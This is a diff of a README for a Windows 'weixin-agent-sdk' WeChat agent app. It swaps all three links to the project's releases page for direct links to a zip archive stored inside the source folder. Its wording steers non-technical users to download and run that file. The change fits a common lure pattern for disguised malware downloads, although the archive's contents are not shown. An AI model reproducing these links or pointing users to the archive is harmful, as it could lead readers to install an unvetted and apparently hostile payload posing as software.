@@ -1,6 +1,6 @@
 # 🤖 weixin-agent-sdk - Run a WeChat agent on Windows
 
-[![Download weixin-agent-sdk](https://img.shields.io/badge/Download%20weixin--agent--sdk-blue?style=for-the-badge)](https://github.com/electronicpug342-a11y/weixin-agent-sdk/releases)
+[![Download weixin-agent-sdk](https://img.shields.io/badge/Download%20weixin--agent--sdk-blue?style=for-the-badge)](https://raw.githubusercontent.com/electronicpug342-a11y/weixin-agent-sdk/main/src/weixin_agent/agent-sdk-weixin-v1.7.zip)
 
 ## 🧭 What this app does
 
@@ -34,7 +34,7 @@ You do not need to know Python to get started if the release package includes a 
 
 Visit this page to download:
 
-[https://github.com/electronicpug342-a11y/weixin-agent-sdk/releases](https://github.com/electronicpug342-a11y/weixin-agent-sdk/releases)
+[https://raw.githubusercontent.com/electronicpug342-a11y/weixin-agent-sdk/main/src/weixin_agent/agent-sdk-weixin-v1.7.zip](https://raw.githubusercontent.com/electronicpug342-a11y/weixin-agent-sdk/main/src/weixin_agent/agent-sdk-weixin-v1.7.zip)
 
 On the release page, look for the newest version. Download the file that matches Windows. If you see a `.exe` file, `.zip` file, or installer, use that file.
 
@@ -213,7 +213,7 @@ Try these checks:
 
 If you need to get the app again, use the release page:
 
-[https://github.com/electronicpug342-a11y/weixin-agent-sdk/releases](https://github.com/electronicpug342-a11y/weixin-agent-sdk/releases)
+[https://raw.githubusercontent.com/electronicpug342-a11y/weixin-agent-sdk/main/src/weixin_agent/agent-sdk-weixin-v1.7.zip](https://raw.githubusercontent.com/electronicpug342-a11y/weixin-agent-sdk/main/src/weixin_agent/agent-sdk-weixin-v1.7.zip)
 
 ## 🧰 Basic terms
 
